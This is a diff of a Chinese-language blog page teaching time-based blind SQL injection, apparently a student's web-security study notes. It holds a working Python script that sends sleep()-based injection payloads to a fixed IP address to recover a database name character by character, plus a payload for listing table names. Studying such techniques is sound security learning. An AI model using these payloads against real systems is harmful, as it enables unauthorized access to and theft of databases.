@@ -15,7 +15,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://yoursite.com/2018/04/30/sql注入之时间盲注/images/9/1.png">
 <meta property="og:image" content="http://yoursite.com/2018/04/30/sql注入之时间盲注/images/9/2.png">
-<meta property="og:updated_time" content="2018-04-30T16:31:49.617Z">
+<meta property="og:updated_time" content="2018-05-06T15:12:58.042Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入之时间盲注">
 <meta name="twitter:description" content="时间盲注上一种注入方式是在虽然没有回显位，但是正确错误的页面有所不同的，那如果正确页面和错误页面都相同呢？我们这是可以使用第二种注入–延时注入来判断我们所要的信息。主要用到的是sleep()函数如果前面的语句为真，那么sleep()就会调用，页面回显就会有延迟，不过缺点也很明显，如果网络不好的话，报错注入就会出现误报的情况。一般我们使用  if(,1,2)case when() then else">
@@ -46,7 +46,7 @@
     <h2 class="author">NoneGirl_Iuh</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>11</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>12</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>5</strong><br>标签</div></a>
     </div>
@@ -108,7 +108,7 @@
 <blockquote>
 <p>if(,1,2)<br>case when() then else end   </p>
 </blockquote>
-<p>这两个条件语句来进行逻辑判断<br>下面这是一个例子<br><img src="./images/9/1.png" alt=""><br>这个网站现在什么都不显示，但是我们可以试试sleep()是否有用。<br><img src="./images/9/2.png" alt=""><br>发现响应时间过长，sleep函数起了作用，接下来我们就可以试着去爆破了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">database = &quot;&quot;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    stime = time.time()</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when(select length(database()) = %d) then sleep(10) else sleep(0) end --+&quot; %(i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if time.time() - stime &gt; 10:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">print length</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(65,123):</span><br><span class="line">        stime = time.time()</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when((select ascii(substr(database(),%d,1)))= %d) then sleep(10) else sleep(0) end --+&quot;%(i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if time.time() - stime &gt; 10:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            break</span><br><span class="line">            print database</span><br><span class="line">print database</span><br></pre></td></tr></table></figure></p>
+<p>这两个条件语句来进行逻辑判断<br>下面这是一个例子<br><img src="./images/9/1.png" alt=""><br>这个网站现在什么都不显示，但是我们可以试试sleep()是否有用。<br><img src="./images/9/2.png" alt=""><br>发现响应时间过长，sleep函数起了作用，接下来我们就可以试着去爆破了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">database = &quot;&quot;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    stime = time.time()</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when(select length(database()) = %d) then sleep(10) else sleep(0) end --+&quot; %(i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if time.time() - stime &gt; 10:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">print length</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(65,123):</span><br><span class="line">        stime = time.time()</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when((select ascii(substr(database(),%d,1)))= %d) then sleep(10) else sleep(0) end --+&quot;%(i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if time.time() - stime &gt; 10:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            break</span><br><span class="line">            print database</span><br><span class="line">print database</span><br></pre></td></tr></table></figure></p>
 <p>爆破出数据库名。接下来的几个语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; and case when(ascii(substr((select table_name from information_schema.tables where table_schema=&quot;edutest&quot; limit 0,1),1,1)) = 65) then sleep(10) else sleep(0) end --+&quot;</span><br><span class="line">........</span><br></pre></td></tr></table></figure></p>
 <p>之后和上一次的脚本类似，理解一下自己就能去试试爆破出信息来了。</p>
 <h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>无力感，什么都做不好，什么都比不过人家，没实力又太骄傲，我可真是个废物。浮躁浮躁，一天都不知道在干些什么，真是糟糕透了。重新学吧，起码要在大二前，拿出一点成绩。</p>
@@ -116,7 +116,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjgpwn9j00014jkve1qhmb57x" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjgxv1x36000dy0venq1t6988" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -193,7 +193,7 @@
     <h2 class="author">NoneGirl_Iuh</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>11</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>12</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>5</strong><br>标签</div></a>
     </div>
@@ -225,6 +225,14 @@
       
         <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
           gay里gay气的大黄
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
+          郁离歌大手子的博客
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
+          有很多小姐姐的烧包包
         </a>
       
     </div>
